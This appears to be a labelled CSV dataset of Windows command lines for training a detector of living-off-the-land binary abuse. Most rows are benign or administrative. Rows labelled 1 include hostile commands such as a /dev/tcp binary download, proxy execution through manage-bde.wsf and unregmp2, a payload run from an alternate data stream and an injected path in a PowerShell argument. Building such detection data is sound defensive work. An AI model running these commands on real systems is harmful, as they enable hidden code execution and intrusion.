Command,Label
C:\Program Files\tasklist.exe /v,0
dotnet.exe msbuild {PATH:.csproj},1
C:\Windows\System32\net.exe localgroup Administrators xekhmaxf /add,0
"del ""D:\Program Files\ogvdo.dll"" /f /q",0
"icacls.exe ""C:\Windows\Users\vcpavuy.dll"" /grant Everyone:F",0
"type.exe ""C:\AppData\ufhouorr.sys""",0
"mkdir ""D:\Users\Windows""",0
"findstr.exe /C:""GvQ1cavMWJFq"" ""D:\Program Files\Logs\wrqbuo.txt""",0
"rmdir.exe ""C:\Logs\Windows"" /s /q",0
"echo.exe %DATE% %TIME% >> ""D:\Users\tbzxqjju\Downloads\wysoikwo.dll""",0
C:\Windows\net.exe localgroup Administrators guest /add,0
net.exe user cgoyzewy /add,0
"mkdir.exe ""C:\Users\AppData""",0
C:\Program Files\icacls.exe document.txt /grant Everyone:R,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\bgwlhjvb\Desktop\rnafvl.log\"" \""C:\Windows\quxbed.txt\"""" /sc daily /st 23:00",0
"del ""D:\Users\Temp\fnihzyn.log"" /f /q",0
"echo.exe %DATE% %TIME% >> ""D:\Temp\zprdihhwbc.dll""",0
"attrib +h ""D:\AppData\iwowdofy.txt""",0
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1
"associate controllers [add] 223[,223 [,…]]",0
"C:\Windows\attrib.exe +h ""D:\Temp\Logs\adpsmcbd.sys""",0
net.exe localgroup Administrators admin /add,0
"certutil.exe -hashfile ""C:\AppData\jnvafgcn.log"" SHA256",0
C:\Program Files (x86)\net.exe localgroup Administrators user1 /add,0
icacls.exe data.log /grant Everyone:R,0
ping.exe 192.168.177.192,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\Users\xafektslyd.exe\"" \""C:\Users\amwx\Desktop\wncfzskw.dll\"""" /sc daily /st 23:00",0
"forfiles /S /M *.* /D -01/01/2007 /C ""cmd /c echo.exe @file is outdated.""",0
echo.exe YddETMiBMSlA > D:\Users\AppData\prbty.log,0
"findstr.exe /C:""aRK7t27zVqHC"" ""D:\AppData\AppData\nkbnurn.dll""",0
"associate controllers [add] 943[,943 [,…]]",0
C:\Windows\certutil.exe -hashfile backup.dat SHA256,0
ping.exe 192.168.4.132,0
"attrib.exe +h ""C:\Program Files\Users\jrlivraknh.sys""",0
echo Buq2h6kOzjzG > C:\Windows\Users\anrlcui.txt,0
net.exe localgroup Administrators admin /add,0
"type.exe ""D:\AppData\Windows\svfxx.dat""",0
"findstr /C:""GvVg8hgmJLLJ"" ""C:\Logs\jjkriq.sys""",0
net.exe use Z: \\192.168.191.149\public,0
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,1
"mkdir ""C:\Users\tzympuh\Downloads\Pictures""",0
C:\Windows\dir.exe D:\Data,0
"certutil -hashfile ""C:\AppData\Users\octcfqk.dat"" SHA256",0
"del ""D:\Users\tudu\Downloads\Pictures\fpgxgh.ini"" /f /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\alihdai\Pictures\Pictures\qszgd.log\"" \""C:\Users\Users\whmnx.sys\"""" /sc daily /st 23:00",0
"type.exe ""C:\Temp\Windows\zsusaix.sys""",0
ping.exe 192.168.104.121,0
"attrib.exe +h ""D:\Program Files\Temp\kyfyko.log""",0
ping.exe 192.168.68.221,0
"del ""C:\Users\sfwt\Downloads\gcyqbjvy.log"" /f /q",0
ping.exe 192.168.104.230,0
"C:\Program Files (x86)\powershell.exe -Command ""Get-Process""",0
"E:\Windows\System32\attrib.exe +h ""C:\AppData\Logs\hfspotej.log""",0
"type ""D:\Users\yoohju\Desktop\Downloads\fjledqtk.exe""",0
"copy ""C:\Users\gdckyjey\Pictures\Downloads\lnftduzzl.txt"" ""D:\AppData\esacyyio.log""",0
"echo %DATE% %TIME% >> ""D:\Program Files\lukxo.ini""",0
"icacls ""D:\Temp\olpmq.sys"" /grant Everyone:F",0
"move ""C:\Logs\Temp\yxmeqci.dat"" ""C:\Users\vyiprh.exe""",0
net.exe user gejbazwm /add,0
tar -xf {PATH_SMB:.tar},1
ping.exe 192.168.124.59,0
"mkdir.exe ""D:\Users\ibakzy\Documents""",0
"attrib.exe +h ""D:\Users\ectyv.sys""",0
merge vdisk depth=259,0
"findstr /C:""T9Kr7IJljPWx"" ""C:\Temp\Logs\jyeyn.exe""",0
"certutil.exe -hashfile ""D:\Windows\ereewri.dat"" SHA256",0
"icacls ""D:\Users\fjogbj\Pictures\Pictures\ihesu.txt"" /grant Everyone:F",0
"move.exe ""D:\Windows\wfldyt.ini"" ""D:\AppData\Program Files\sospcbblg.log""",0
"findstr /C:""kz18Zlvlu48y"" ""D:\Users\hqvwrvou\Downloads\ldahzo.ini""",0
"attrib.exe +h ""C:\Logs\ohrfci.sys""",0
"certutil.exe -hashfile ""C:\Logs\aftyumahwi.ini"" SHA256",0
"powershell.exe -Command ""Get-Service""",0
net.exe localgroup Administrators yyctzptz /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\emmlkmduay.log\"" \""D:\Windows\emiqkmk.ini\"""" /sc daily /st 23:00",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\Users\kvmdp.sys\"" \""C:\Temp\AppData\ffjomwa.log\"""" /sc daily /st 23:00",0
net.exe localgroup Administrators yqjkjhar /add,0
C:\Windows\System32\echo.exe ywUy5m6jmf7p > D:\Program Files\hqawluu.txt,0
netsh.exe advfirewall show allprofiles,0
"powershell.exe -Command ""Get-Process""",0
C:\Windows\net.exe localgroup Administrators oqkcurjj /add,0
ping 192.168.172.140,0
"rmdir.exe ""C:\Temp\Program Files"" /s /q",0
net.exe user wqupkxuk /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\zvkkgcnu.dll\"" \""D:\Program Files\gyrlbtqib.sys\"""" /sc daily /st 23:00",0
"echo.exe %DATE% %TIME% >> ""D:\AppData\akfab.txt""",0
"fsutil.exe file layout ""C:\Logs\uzffutfu.txt""",0
"rmdir ""C:\Users\frovt\Documents"" /s /q",0
D:\Windows\System32\echo.exe zRJXVHjd0E87 > D:\Temp\uoqhlkqo.sys,0
"type ""C:\AppData\yzkfag.log""",0
"certutil.exe -hashfile ""C:\Users\wsmgm\Pictures\Pictures\kwbidqjt.txt"" SHA256",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\sghgxr.sys\"" \""C:\Logs\fesjcw.dll\"""" /sc daily /st 23:00",0
"findstr /C:""oNxrvOxTpbAa"" ""C:\Temp\cdacu.exe""",0
ping.exe 192.168.190.163,0
rem,0
net.exe use Z: \\192.168.170.42\data,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\pphgggj.exe\"" \""D:\AppData\enluhocca.exe\"""" /sc daily /st 23:00",0
echo 5lXRPpBwT29i > D:\Users\ynqfcg\Pictures\Pictures\khkdbiij.exe,0
echo.exe PoRe8uUSjG1s > D:\Users\lwccjk.dat,0
net use Z: \\192.168.74.29\data,0
(ar??1991.* ap??1991.*),0
"C:\Windows\fsutil.exe file layout ""C:\Windows\Program Files\flxgxgcf.log""",0
"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",1
"echo %DATE% %TIME% >> ""D:\Temp\Temp\hycgyvm.exe""",0
"echo %DATE% %TIME% >> ""C:\Users\ujvvb\Downloads\efgclmf.exe""",0
net.exe localgroup Administrators guest /add,0
C:\Windows\fsutil.exe devdrv trust [/f] D:\Logs,0
"dir.exe ""D:\Program Files\Program Files"" /s /b",0
"echo.exe %DATE% %TIME% >> ""C:\AppData\AppData\qfzxwv.dat""",0
systeminfo.exe,0
"dir.exe ""D:\Temp\Logs""",0
net.exe use Z: \\192.168.61.126\backup,0
"icacls ""D:\Temp\qrnzggjy.txt"" /grant Everyone:F",0
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',1
"type ""C:\AppData\Logs\hnmzqpjbyf.dll""",0
"certutil.exe -hashfile ""D:\AppData\Program Files\jpgxiem.log"" SHA256",0
"echo %DATE% %TIME% >> ""C:\Users\Windows\sdccrf.exe""",0
netsh.exe interface show interface,0
"echo.exe %DATE% %TIME% >> ""C:\Windows\Logs\hqjzf.dat""",0
"fsutil.exe devdrv setFiltersAllowed [[/f] /volume C:\Windows] """"filter1, filter 2, ...""""",0
"dir ""D:\Program Files\Program Files""",0
"attrib.exe +h ""D:\Users\ntcim.dat""",0
"powershell.exe -Command ""Get-Service""",0
systeminfo.exe,0
net use Z: \\192.168.145.159\data,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\Program Files\kwsnoxvycl.exe\"" \""D:\Program Files\wvxddr.dat\"""" /sc daily /st 23:00",0
net.exe use Z: \\192.168.147.165\data,0
delete partition,0
C:\Program Files\wmic.exe process list brief,0
"icacls ""D:\Windows\kkjwvvvawx.exe"" /grant Everyone:F",0
C:\Program Files\netstat.exe -an,0
arp.exe -a,0
C:\Program Files (x86)\cmd.exe /c dir C:\Temp,0
net.exe use Z: \\192.168.25.245\data,0
"fsutil file layout ""C:\AppData\guajs.txt""",0
"certutil.exe -hashfile ""D:\Temp\qyjewhw.ini"" SHA256",0
fsutil.exe volume [diskfree] C:\Users\stsa\Downloads\Pictures,0
"Rem/||( The REM statement evaluates to success, so these lines will never be executed. Keep in mind that you will need to escape closing parentheses within multi-line comment blocks like shown in this example. ^) )",0
"copy.exe ""C:\Logs\Temp\mixxtqeq.dat"" ""C:\Temp\zpbjrnlljj.ini""",0
"dir ""D:\Logs"" /s /b",0
C:\Windows\System32\netstat.exe -s -p tcp udp,0
"powershell.exe -Command ""Get-Process""",0
"copy.exe ""D:\Users\Temp\ojgfyjfnsj.dll"" ""D:\Program Files\dprrgqii.ini""",0
"echo.exe %DATE% %TIME% >> ""C:\Program Files\aqpizkzbfo.txt""",0
Gpscript /startup,1
"C:\Windows\certutil.exe -hashfile ""C:\Users\saeh\Pictures\Desktop\saond.dat"" SHA256",0
"del ""D:\Users\jqimfh\Desktop\nadqbeb.dat"" /f /q",0
net localgroup Administrators ayhogmrc /add,0
"findstr /C:""PLo34bzqPrr7"" ""C:\Logs\Windows\khyxjgrky.dat""",0
"rmdir.exe ""C:\Users\uihkpp\Documents"" /s /q",0
net.exe localgroup Administrators qpdawoyc /add,0
"dir.exe ""D:\Windows\Temp"" /s /b",0
"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",1
"type.exe ""C:\Users\rqdcrrirdl.log""",0
"rmdir.exe ""D:\Users\bktwrp\Documents\Pictures"" /s /q",0
"C:\Windows\dir.exe ""D:\Users\sjle\Documents\Documents"" /s /b",0
"echo.exe %DATE% %TIME% >> ""D:\Logs\Windows\jzgzlmts.dll""",0
"fsutil.exe file layout ""D:\Temp\Program Files\tuzelhtqoa.dll""",0
"C:\Windows\findstr.exe /C:""wsSLYq63bmeK"" ""C:\Users\iafof\Downloads\ekmhuzxnem.sys""",0
net.exe localgroup Administrators bzwhzpdr /add,0
"rmdir.exe ""C:\Temp\Logs"" /s /q",0
"del ""C:\Program Files\ydyzgl.exe"" /f /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\rmdaz.dll\"" \""D:\AppData\vupxy.log\"""" /sc daily /st 23:00",0
"dir.exe ""C:\AppData\AppData"" /s /b",0
echo.exe MVvpXUn00nYa > C:\Windows\Program Files\jdoiv.dat,0
netstat.exe -an,0
icacls.exe config.ini /grant Everyone:R,0
"attrib +h ""C:\Temp\Program Files\thjvni.dll""",0
"findstr /C:""EeB6tybC6SSA"" ""C:\Users\Temp\qxlju.log""",0
"type.exe ""C:\Program Files\zgvhbh.ini""",0
C:\Windows\System32\net.exe localgroup Administrators eqghymgx /add,0
"type ""D:\Logs\AppData\xnhoowkw.sys""",0
"fsutil.exe devdrv setFiltersAllowed [[/f] /volume D:\Users\egajha\Downloads] """"filter1, filter 2, ...""""",0
ping.exe 192.168.61.216,0
"icacls ""C:\Users\clcpuzsmtn.ini"" /grant Everyone:F",0
chap initiator remember secret=[AgDa9RLHG0GTPkI4] target=iqn.2025-11.com.example:lvnfbrtk,0
tftp.exe  -i Host1 get boot.img,0
remove [{letter=E | mount=C:\Users\dvxhox\Pictures [all]}] [noerr],0
"C:\Windows\attrib.exe +h ""C:\Users\shdssalq\Downloads\Downloads\nbgof.log""",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
C:\Program Files (x86)\netstat.exe -an,0
C:\Program Files (x86)\net.exe user backup /add,0
"findstr.exe /C:""OwhFT1wlSvoG"" ""C:\Logs\gjzmjbj.log""",0
"(Controller ports active after this command: Ctlr 0 Port 0, Ctlr 0 Port 1, Ctlr 1 Port 1)",0
VSLaunchBrowser.exe .exe {REMOTEURL:.exe},1
online volume,0
arp.exe -a,0
"fsutil.exe file layout ""C:\Users\wqpww\Downloads\tvfvtmait.txt""",0
"powershell.exe -Command ""Get-Process""",0
"rmdir.exe ""D:\Users\tccnhfug\Documents\Desktop"" /s /q",0
fsutil.exe usn [enumdata] <fileref> <lowUSN> <highUSN> <volumepath>,0
tasklist.exe /v,0
create tpgroup [noerr],0
"move ""C:\Program Files\Logs\gzskharpnp.txt"" ""D:\Windows\bejbks.dat""",0
"rmdir.exe ""D:\Logs\Windows"" /s /q",0
net.exe localgroup Administrators citzzdix /add,0
"del ""D:\Temp\Program Files\iqowj.dll"" /f /q",0
"move ""C:\Program Files\Temp\qxydzpx.ini"" ""D:\Temp\shzjrks.dat""",0
"dir.exe ""D:\Windows"" /s /b",0
ping 192.168.183.176,0
"del ""D:\AppData\qgdwlqxilj.sys"" /f /q",0
"C:\Windows\copy.exe ""C:\Logs\Users\ihlopk.log"" ""C:\Users\dspclk\Pictures\Downloads\qeueph.ini""",0
"fsutil file layout ""C:\Program Files\Users\wlgozt.exe""",0
net localgroup Administrators ymckxibk /add,0
"icacls ""C:\Logs\hierhier.txt"" /grant Everyone:F",0
net.exe use Z: \\192.168.8.106\data,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\Users\tqtstsl\Downloads\ezzdd.dll""",0
netsh.exe interface show interface,0
net.exe localgroup Administrators ijbsjyvg /add,0
"move ""C:\Windows\Users\ckutwhxcmj.dat"" ""C:\Temp\Temp\qdpby.dat""",0
net.exe use Z: \\192.168.229.62\public,0
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path D:\Windows -Recurse | Select-Object FullName, Length""",0
C:\Windows\net.exe use Z: \\192.168.224.186\backup,0
net.exe user kvwnkuaw /add,0
"copy ""C:\Temp\zeforlo.exe"" ""C:\Program Files\AppData\sjrprvkqh.dll""",0
Rem vIvkj31TnL6SlT7WxAzp,0
detail disk,0
ping.exe 192.168.192.177,0
net.exe user xznfvupk /add,0
net.exe use Z: \\192.168.95.165\backup,0
"C:\Windows\System32\copy.exe ""C:\AppData\Temp\ualxfz.dll"" ""C:\Temp\jdgmpacct.dat""",0
D:\Windows\net.exe localgroup Administrators vwxgogpg /add,0
"type.exe ""D:\Users\Users\xjdmfffa.txt""",0
net.exe use Z: \\192.168.174.29\backup,0
ping.exe 10.0.0.1,0
"certutil.exe -hashfile ""C:\Users\htxumt\Downloads\ruykrgjgu.ini"" SHA256",0
"certutil.exe -hashfile ""C:\Logs\ihnrvdbd.txt"" SHA256",0
ping 192.168.98.92,0
"powershell -Command ""Get-ChildItem -Path C:\AppData -Recurse | Select-Object FullName, Length""",0
"type.exe ""C:\Users\auybgpzn\Documents\Downloads\buqmoyl.dat""",0
net.exe use Z: \\192.168.187.121\data,0
ping 192.168.217.9,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\zzuwfhvb.sys\"" \""D:\Users\gowrpob\Downloads\Downloads\rcmwbgblr.log\"""" /sc daily /st 23:00",0
"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",1
"fsutil.exe file layout ""C:\Users\knrjxg.ini""",0
"powershell.exe -Command ""Get-Process""",0
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},1
"type.exe ""D:\Users\ddmavjbq\Pictures\uollzqtyum.ini""",0
"C:\Windows\System32\certutil.exe -hashfile ""D:\Program Files\Temp\cwtbohbu.ini"" SHA256",0
E:\Windows\fsutil.exe volume [querycluster] C:\Logs\Users <cluster> [<cluster>] …,0
net use Z: \\192.168.181.140\backup,0
"copy ""C:\Users\pvdfnbi\Documents\Desktop\hwjmx.dat"" ""C:\Program Files\uiidjseo.log""",0
"echo %DATE% %TIME% >> ""C:\Windows\Windows\vwroiam.exe""",0
net.exe localgroup Administrators backup /add,0
"C:\Windows\findstr.exe /C:""Xt6EgVJSxZoL"" ""D:\AppData\Temp\hlbebbhotx.log""",0
net.exe use Z: \\192.168.76.57\backup,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
net.exe user user1 /add,0
net.exe user dvkkdnqj /add,0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
expose %systemvolumeshadow% p:,0
"move.exe ""D:\Users\phwqm\Desktop\cbyvk.log"" ""C:\AppData\akzcxfswf.dat""",0
"E:\Windows\dir.exe ""D:\Users\Logs""",0
net.exe localgroup Administrators kvaznlih /add,0
"del ""D:\Windows\xxacssins.exe"" /f /q",0
"icacls.exe ""C:\Temp\Logs\vtdptlqxyr.txt"" /grant Everyone:F",0
"powershell -Command ""Get-ChildItem -Path C:\Users\Program Files -Recurse | Select-Object FullName, Length""",0
"fsutil file layout ""C:\AppData\AppData\wrwwtgwr.exe""",0
"echo.exe %DATE% %TIME% >> ""D:\Users\mbshup\Downloads\Downloads\cnatueslcz.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Windows\zneidugqd.ini\"" \""C:\Users\oxyatsg\Pictures\Pictures\ebimfypaa.log\"""" /sc daily /st 23:00",0
"powershell.exe -Command ""Get-Service""",0
"D:\Windows\System32\type.exe ""D:\AppData\Users\nyqtbcms.txt""",0
netsh.exe advfirewall show allprofiles,0
"rmdir ""C:\Users\vmxf\Pictures\Pictures"" /s /q",0
C:\Windows\net.exe use Z: \\192.168.150.174\public,0
expose %datavolumeshadow% q:,0
* Shadow Copy ID = {ff47165a-1946-4a0c-b7f4-80f46a309278},0
HH.exe {PATH_ABSOLUTE:.exe},1
"move.exe ""D:\Users\Program Files\tohbxcird.ini"" ""D:\Program Files\Logs\pgzumsn.dll""",0
net user lxdhcmne /add,0
ie4uinit.exe -BaseSettings,1
"del ""D:\Users\lerfeive\Downloads\nnvsjjcvz.log"" /f /q",0
"echo %DATE% %TIME% >> ""C:\AppData\rqypy.exe""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\ffwipcm\Documents\sprte.exe\"" \""C:\AppData\Temp\sfywt.txt\"""" /sc daily /st 23:00",0
cmd.exe /c dir D:\Data,0
"dir.exe ""D:\Users\vner\Downloads\Pictures"" /s /b",0
C:\Windows\net.exe localgroup Administrators nysehalc /add,0
"fsutil file layout ""D:\Program Files\AppData\degvv.log""",0
"C:\Windows\findstr.exe /C:""qHChygScW4SU"" ""D:\Users\lemzdpyw\Desktop\Pictures\ahodt.ini""",0
"copy.exe ""C:\Users\zqinr\Documents\Downloads\psqbhy.dat"" ""C:\Users\eorafz.ini""",0
"certutil.exe -hashfile ""C:\Users\AppData\idqra.txt"" SHA256",0
"findstr /C:""NM2h0aKLTGAm"" ""C:\Windows\Windows\tjhdsnt.ini""",0
"move ""D:\Logs\Logs\jcrcidmj.sys"" ""C:\Users\zraod.log""",0
netsh.exe interface show interface,0
"dir ""D:\Program Files\AppData""",0
repair disk=254 [align=254] [noerr],0
net localgroup Administrators wshbmwwo /add,0
"icacls.exe ""C:\Users\vxygwwpw\Desktop\Documents\stwxdqdup.sys"" /grant Everyone:F",0
net.exe localgroup Administrators uzhplhzh /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Program Files\plpfkrhsk.dll\"" \""C:\AppData\Program Files\ikdptrrlq.sys\"""" /sc daily /st 23:00",0
netsh.exe advfirewall show allprofiles,0
"C:\Windows\mkdir.exe ""C:\Temp\Program Files""",0
"for /f [<parsingkeywords>] {%%|%}i in (""echo @file"") do echo @file [<commandlineoptions>]",0
"del ""D:\AppData\Windows\cbiqyfruva.dat"" /f /q",0
"del ""C:\Windows\Program Files\nxxjqnn.dll"" /f /q",0
"fsutil.exe file layout ""D:\AppData\Temp\rawbvtbezc.dat""",0
fsutil.exe usn [readjournal] [c= <chunk-size> s=<file-size-threshold>] <volumepath>,0
dnscmd <servername> echo.exe @file [<command parameters>],0
fsutil.exe volume [querycluster] C:\Temp <cluster> [<cluster>] …,0
certutil.exe -hashfile backup.dat SHA256,0
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",1
echo CbPd68wGKnvK > D:\AppData\Program Files\izzrqludp.sys,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Logs\Logs -Recurse | Select-Object FullName, Length""",0
fsutil wim [enumfiles] C <data source>,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\dxnhfsdo\Desktop\Pictures\zxmjztex.log\"" \""D:\Program Files\pdoyppyioy.dat\"""" /sc daily /st 23:00",0
net.exe user dmflzpkb /add,0
net.exe user txqohoeo /add,0
net.exe user user1 /add,0
net localgroup Administrators parqhcjq /add,0
convert dynamic [noerr],0
net localgroup Administrators izcllntk /add,0
list {hbaports | iadapters | iportals | providers | subsystems | controllers | ports | drives | LUNs | tportals | targets | tpgroups},0
"associate controllers [add] 7[,7 [,…]]",0
"type ""D:\Users\jlqyp.ini""",0
ipconfig.exe /all,0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\fxcrones\Documents\Documents -Recurse | Select-Object FullName, Length""",0
"dir ""C:\Users\Program Files""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Windows\wqnihjjinu.exe\"" \""C:\Logs\Logs\tbxnrnkk.ini\"""" /sc daily /st 23:00",0
"mkdir.exe ""C:\Logs\Program Files""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\uhwc\Downloads\Documents\ppefoehmx.dll\"" \""D:\Logs\Logs\zpnbfzuwxn.log\"""" /sc daily /st 23:00",0
"fsutil.exe file layout ""D:\AppData\Windows\uipjwmer.txt""",0
"icacls.exe ""C:\Users\rbbg\Documents\Downloads\tiqakjnwv.sys"" /grant Everyone:F",0
"eventcreate /s server /t ERROR /id 100 /l application /d ""Remote machine without user credentials""",0
net user ajatfcox /add,0
"attrib +h ""C:\Program Files\AppData\mymtgwtt.exe""",0
tasklist.exe /v,0
"attrib.exe +h ""C:\Program Files\gpupqgrl.dat""",0
"C:\Windows\rmdir.exe ""D:\Users"" /s /q",0
"icacls ""C:\Program Files\Temp\vnabsajat.sys"" /grant Everyone:F",0
net.exe user user1 /add,0
"move ""C:\Windows\Users\bzpwyjja.sys"" ""C:\AppData\Windows\ycozcedjuu.exe""",0
net.exe user kknbvaah /add,0
finger user1@users.microsoft.com,0
net.exe localgroup Administrators zqkxneeu /add,0
"dir.exe ""C:\Users\sgow\Desktop\Desktop"" /s /b",0
"type.exe ""C:\Program Files\Program Files\qduxwqtts.dll""",0
"findstr.exe /C:""QmRaLbohhTlj"" ""C:\Logs\wdbfbs.ini""",0
"certutil.exe -hashfile ""D:\AppData\Users\wxpbwq.txt"" SHA256",0
"icacls.exe ""D:\Users\jvoqty\Documents\Downloads\eadqiywz.sys"" /grant Everyone:F",0
net.exe use Z: \\192.168.225.220\data,0
ping.exe 192.168.1.1,0
"echo.exe %DATE% %TIME% >> ""D:\Windows\tbdfbmufw.sys""",0
"type ""C:\Logs\Temp\wtvmqzoyvb.ini""",0
"type.exe ""C:\Users\gitefwpi.txt""",0
net use Z: \\192.168.104.24\public,0
"fsutil.exe file layout ""C:\Users\hwkvof.log""",0
net use Z: \\192.168.83.158\data,0
icacls.exe document.txt /grant Everyone:R,0
"del ""D:\Temp\nykbxzii.log"" /f /q",0
net localgroup Administrators ztbmsqhv /add,0
C:\Windows\echo.exe TPGaF45bTTjo > C:\Windows\lcqrkxu.txt,0
"move.exe ""C:\Temp\AppData\ilfszf.log"" ""C:\Users\hwddcbev\Downloads\dyecszfqo.log""",0
"C:\Windows\System32\copy.exe ""D:\Users\gqcpxre.sys"" ""C:\Temp\Users\mozlgleriz.ini""",0
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,1
"tasklist | findstr ""explorer.exe""",0
"icacls ""C:\Users\himbsoiwd.dll"" /grant Everyone:F",0
"certutil.exe -hashfile ""C:\Temp\gzrismp.dll"" SHA256",0
net.exe localgroup Administrators oeluvqag /add,0
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},1
C:\Windows\System32\systeminfo.exe,0
"dir.exe ""C:\Program Files\Program Files"" /s /b",0
echo.exe P0ZlLbOmMFTX > C:\Program Files\egyjudx.dat,0
netstat.exe -an,0
"echo %DATE% %TIME% >> ""C:\Users\gikdqaoo.ini""",0
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",1
"extend lun [size=4615] [drives=8, [8, ...]] [noerr]",0
certutil.exe -hashfile data.log SHA256,0
certutil.exe -hashfile data.log SHA256,0
"type ""D:\Logs\AppData\gbuzwnj.txt""",0
convert mbr,0
"dir ""C:\AppData"" /s /b",0
"certutil.exe -hashfile ""D:\Users\ljncbfkw\Downloads\Pictures\pxjejye.dat"" SHA256",0
"C:\Windows\System32\icacls.exe ""D:\Users\AppData\fpjaz.dll"" /grant Everyone:F",0
"copy ""D:\Program Files\Logs\pieignem.exe"" ""D:\Users\zzpzbmb\Downloads\Documents\wkhdln.log""",0
"powershell -Command ""Get-ChildItem -Path C:\Temp\Windows -Recurse | Select-Object FullName, Length""",0
net.exe user pedmcymv /add,0
net.exe use Z: \\192.168.27.164\data,0
"certutil.exe -hashfile ""C:\Users\donc\Documents\Downloads\coulla.ini"" SHA256",0
"findstr /C:""ksuuyhhsykWm"" ""C:\AppData\suicwmhr.sys""",0
"echo.exe %DATE% %TIME% >> ""C:\Users\fiphrgcz\Pictures\Downloads\tucdkv.dat""",0
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1
net.exe user guest /add,0
"del ""C:\Users\awnf\Downloads\ruzazuj.txt"" /f /q",0
echo upE9qCDXErav > D:\Windows\Windows\moznsdlrr.exe,0
sc query,0
net.exe localgroup Administrators guest /add,0
"dir.exe ""D:\Logs\Program Files""",0
"attrib.exe +h ""C:\Users\Logs\twodxnrrdf.dll""",0
C:\Program Files (x86)\certutil.exe -hashfile data.log SHA256,0
fsutil.exe volume [filelayout] C:\Windows <fileID>,0
net.exe user ssamggbn /add,0
"dir ""D:\Windows\Windows"" /s /b",0
net user qsxxqyom /add,0
cmd.exe - < {PATH}:payload.bat,1
net.exe localgroup Administrators xciqzgop /add,0
ping.exe 8.8.8.8,0
C:\Windows\System32\net.exe use Z: \\192.168.27.118\backup,0
